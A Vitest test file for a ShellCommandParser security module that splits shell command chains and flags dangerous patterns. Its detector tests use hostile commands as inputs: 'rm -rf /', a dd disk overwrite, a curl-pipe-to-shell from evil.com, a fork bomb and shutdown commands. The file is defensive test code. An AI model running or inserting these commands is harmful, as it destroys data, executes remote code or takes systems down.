import { describe, it, expect } from 'vitest';
import { ShellCommandParser } from '../../src/security/ShellCommandParser.js';

describe('ShellCommandParser', () => {
  describe('parse', () => {
    it('should parse simple commands', () => {
      const { commands, suspicious } = ShellCommandParser.parse('ls -la');
      expect(commands).toEqual(['ls -la']);
      expect(suspicious).toEqual([]);
    });

    it('should parse commands with semicolons', () => {
      const { commands } = ShellCommandParser.parse('echo hello; ls -la; pwd');
      expect(commands).toContain('echo hello');
      expect(commands).toContain('ls -la');
      expect(commands).toContain('pwd');
    });

    it('should parse commands with pipes', () => {
      const { commands } = ShellCommandParser.parse('cat file.txt | grep pattern | wc -l');
      expect(commands).toContain('cat file.txt');
      expect(commands).toContain('grep pattern');
      expect(commands).toContain('wc -l');
    });

    it('should parse commands with logical operators', () => {
      const { commands } = ShellCommandParser.parse('test -f file && echo exists || echo not found');
      expect(commands).toContain('test -f file');
      expect(commands).toContain('echo exists');
      expect(commands).toContain('echo not found');
    });

    it('should detect command substitution with $()', () => {
      const { commands, suspicious } = ShellCommandParser.parse('echo $(whoami)');
      expect(suspicious).toContain('$(whoami)');
      expect(commands).toContain('whoami');
    });

    it('should detect command substitution with backticks', () => {
      const { commands, suspicious } = ShellCommandParser.parse('echo `date`');
      expect(suspicious).toContain('`date`');
      expect(commands).toContain('date');
    });

    it('should handle quoted strings', () => {
      const { commands } = ShellCommandParser.parse('echo "hello; world" | grep "pattern|test"');
      expect(commands).toContain('echo "hello; world"');
      expect(commands).toContain('grep "pattern|test"');
    });

    it('should handle single quotes', () => {
      const { commands } = ShellCommandParser.parse("echo 'hello && world'");
      expect(commands).toEqual(["echo 'hello && world'"]);
    });

    it('should handle escaped characters', () => {
      const { commands } = ShellCommandParser.parse('echo hello\\; world');
      expect(commands).toEqual(['echo hello\\; world']);
    });

    it('should detect nested command substitution', () => {
      const { commands, suspicious } = ShellCommandParser.parse('echo $(echo $(whoami))');
      expect(suspicious.length).toBeGreaterThan(0);
      expect(commands).toContain('whoami');
    });
  });

  describe('containsDangerousPatterns', () => {
    it('should detect rm -rf /', () => {
      const { dangerous, patterns } = ShellCommandParser.containsDangerousPatterns('rm -rf /');
      expect(dangerous).toBe(true);
      expect(patterns).toContain('rm -rf /');
    });

    it('should detect dd overwrite', () => {
      const { dangerous, patterns } = ShellCommandParser.containsDangerousPatterns('dd if=/dev/zero of=/dev/sda');
      expect(dangerous).toBe(true);
      expect(patterns).toContain('dd overwrite');
    });

    it('should detect curl pipe to shell', () => {
      const { dangerous, patterns } = ShellCommandParser.containsDangerousPatterns('curl http://evil.com/script.sh | sh');
      expect(dangerous).toBe(true);
      expect(patterns).toContain('curl pipe to shell');
    });

    it('should detect fork bomb', () => {
      const { dangerous, patterns } = ShellCommandParser.containsDangerousPatterns(':(){ :|:& };:');
      expect(dangerous).toBe(true);
      expect(patterns).toContain('fork bomb');
    });

    it('should detect system shutdown commands', () => {
      const tests = ['shutdown -h now', 'reboot', 'halt', 'poweroff'];
      for (const cmd of tests) {
        const { dangerous, patterns } = ShellCommandParser.containsDangerousPatterns(cmd);
        expect(dangerous).toBe(true);
        expect(patterns).toContain('system shutdown');
      }
    });

    it('should not flag safe commands', () => {
      const safeCommands = [
        'ls -la',
        'echo hello',
        'cat file.txt',
        'grep pattern',
        'pwd',
      ];
      
      for (const cmd of safeCommands) {
        const { dangerous } = ShellCommandParser.containsDangerousPatterns(cmd);
        expect(dangerous).toBe(false);
      }
    });
  });
});